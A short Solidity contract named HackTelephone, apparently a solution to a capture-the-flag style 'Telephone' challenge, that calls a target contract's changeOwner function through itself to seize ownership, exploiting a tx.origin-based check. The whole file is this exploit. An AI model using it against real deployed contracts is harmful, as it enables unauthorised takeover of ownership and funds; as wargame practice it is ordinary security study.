// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./ITelephone.sol";

contract HackTelephone {
    ITelephone telephoneContract;

    function setTelephoneContract(address _address) external {
        telephoneContract = ITelephone(_address);
    }

    function hackOwner(address _newOwner) public {
        telephoneContract.changeOwner(_newOwner);
    }
}